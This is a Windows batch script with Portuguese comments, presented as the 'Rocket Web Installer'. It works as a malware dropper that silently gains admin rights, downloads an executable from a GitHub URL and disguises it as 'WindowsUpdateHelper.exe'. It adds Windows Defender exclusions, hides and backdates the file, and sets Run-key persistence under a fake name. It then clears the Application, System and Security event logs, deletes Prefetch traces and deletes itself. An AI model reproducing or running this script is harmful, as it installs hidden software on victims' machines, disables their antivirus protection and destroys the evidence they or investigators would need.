@echo off
:: ============================================================================
::  ROCKET WEB INSTALLER - "MÉTODO ÚNICO VIA GITHUB"
::  Apenas este .bat é necessário. Ele baixa, oculta e limpa tudo.
:: ============================================================================

setlocal enabledelayedexpansion

:: 0. CONFIGURAÇÃO DO GITHUB (COLOQUE SEU LINK ABAIXO)
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: 1. ELEVAÇÃO SILENCIOSA (Verifica e pede Admin se necessário)
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: 2. CONFIGURAÇÕES DE CAMINHOS
set "EXE_NAME=WindowsUpdateHelper.exe"
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "TARGET_PATH=%INSTALL_DIR%\%EXE_NAME%"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_VAL=WindowsAppsExplorer"

:: 3. LIMPEZA DE VERSÕES ANTIGAS
taskkill /f /im %EXE_NAME% >nul 2>&1
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

:: 4. DOWNLOAD DIRETO DO GITHUB
echo [*] Preparando sistema... (nao feche esta janela)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%URL%', '%TARGET_PATH%') } catch { exit 1 }"
if %errorLevel% neq 0 (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TARGET_PATH%' -UseBasicParsing"
)

:: Verificar se o download funcionou
if not exist "%TARGET_PATH%" (
    msg * "Erro: Nao foi possivel conectar ao servidor de download. Verifique sua internet."
    exit /b
)

:: 5. BYPASS DO DEFENDER E ATRIBUTOS (Ocultação total)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess '%EXE_NAME%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Atributos de Sistema e Oculto
attrib +s +h +r "%TARGET_PATH%" >nul 2>&1

:: Spoof de data (Altera para 5 anos atrás)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f=Get-Item '%TARGET_PATH%'; $d=(Get-Date).AddYears(-5).AddMonths(-2); $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d" >nul 2>&1

:: 6. PERSISTÊNCIA DISCRETA (Modo Monitor)
reg add "%REG_KEY%" /v "%REG_VAL%" /t REG_SZ /d "\"%TARGET_PATH%\" --monitor" /f >nul 2>&1

:: 7. LIMPEZA DE RASTROS E AUTO-DELEÇÃO DO .BAT
:: Iniciar o monitor agora
start "" "%TARGET_PATH%" --monitor

:: Limpar Logs de Eventos
wevtutil cl Application >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1

:: Limpar Prefetch de hoje
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ChildItem 'C:\Windows\Prefetch\*.pf' | Where-Object { $_.Name -like '*INSTALAR*' -or $_.Name -like '*CMD*' -or $_.Name -like '*POWERSHELL*' } | Remove-Item -Force -ErrorAction SilentlyContinue" >nul 2>&1

:: Auto-destruição APENAS do arquivo .bat (para nao apagar a pasta Downloads/Desktop do usuario)
(
    echo @echo off
    echo timeout /t 1 /nobreak ^>nul
    echo del "%~f0" ^>nul 2^>^&1
    echo del "%%~f0" ^>nul 2^>^&1
) > "%TEMP%\suicide.bat"

start /min "" "%TEMP%\suicide.bat"
exit /b

